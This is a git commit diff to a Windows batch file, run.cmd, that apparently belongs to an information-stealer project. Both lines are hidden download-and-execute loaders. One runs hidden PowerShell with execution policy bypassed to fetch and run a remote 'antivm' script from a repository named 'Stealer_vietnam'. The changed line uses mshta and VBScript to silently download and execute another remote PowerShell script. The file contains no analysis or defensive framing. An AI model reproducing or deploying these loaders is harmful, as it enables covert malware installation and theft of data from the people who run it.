079a451847370503c7e45ce2087ccbdade61355f
43a1723 <hai1723notgay@gmail.com>
2024-07-01 12:33:13 +0700

    Update run.cmd

--- run.cmd
+++ run.cmd
@@ -1,3 +1,3 @@
 @echo off
 powershell -Win Hidden -NoP -Command "Set-ExecutionPolicy Bypass -Scope Process; iex (iwr -UseBasicP -Uri 'https://raw.githubusercontent.com/s1uiasdad/Stealer_vietnam/main/file/antivm.bat.ps1')"
-mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$t = Iwr -Uri 'https://raw.githubusercontent.com/43a1723/test/main/download.ps1' -UseBasicParsing; $t -replace 'skid', 'skid' | iex",0))
+mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$t = Iwr -Uri 'https://raw.githubusercontent.com/43a1723/test/main/download.ps1' -USeB | iex",0))
